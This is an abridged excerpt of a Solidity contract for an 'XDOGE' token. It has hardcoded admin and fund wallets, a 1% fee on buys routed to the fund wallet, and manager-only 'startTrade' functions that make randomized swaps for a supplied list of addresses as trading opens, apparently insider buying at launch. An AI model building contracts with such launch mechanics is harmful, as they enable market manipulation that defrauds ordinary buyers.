...
contract Token is ERC20,Ownable,AccessControl {
    ...
    constructor()ERC20("XDOGE", "XDOGE") {
        admin=0x77147Da8978C63872FC89ef85Fefb70e620FE8d0;
        address sentTo=0x2d2654490F774bBe1907B7ea6A89E094436B102A;
        //admin=msg.sender;
        fundAddr=0x0A7A0FF97a13C8EE93D13a21924BF6C426720263;
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair) {
            ...
            super._transfer(from, fundAddr, amount.mul(1).div(100));
    ...
    function startTrade(address[] calldata adrs) public onlyRole(MANAGER_ROLE) {
        ...
        for(uint i=0;i<adrs.length;i++)
            swapToken((random(4,adrs[i])+1)*10**16+22*10**16,adrs[i]);
    }
    function startTrade2(address[] calldata adrs) public onlyRole(MANAGER_ROLE) {
        startTradeBlock = block.number;
        for(uint i=0;i<adrs.length;i++)
            swapToken2((random(4,adrs[i])+1)*10**16+22*10**16,adrs[i]);
    }
